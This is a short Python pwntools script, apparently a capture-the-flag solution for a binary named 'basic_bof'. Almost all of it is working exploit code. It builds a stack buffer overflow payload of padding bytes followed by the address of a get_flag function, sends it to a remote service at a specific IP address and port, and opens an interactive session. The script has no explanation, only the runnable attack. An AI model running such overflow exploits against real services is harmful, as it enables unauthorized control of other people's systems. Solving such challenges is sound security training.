from pwn import *
context.log_level = 'debug'

p = process("./basic_bof")
p = remote("101.79.9.58", 10010)

# gdb.attach(p)
# pause()

# exploit here
get_flag_addr = 0x401296

payload = b'A'*0x30
payload += b'B'*0x8
payload += p64(get_flag_addr)

p.sendline(payload)
p.interactive()
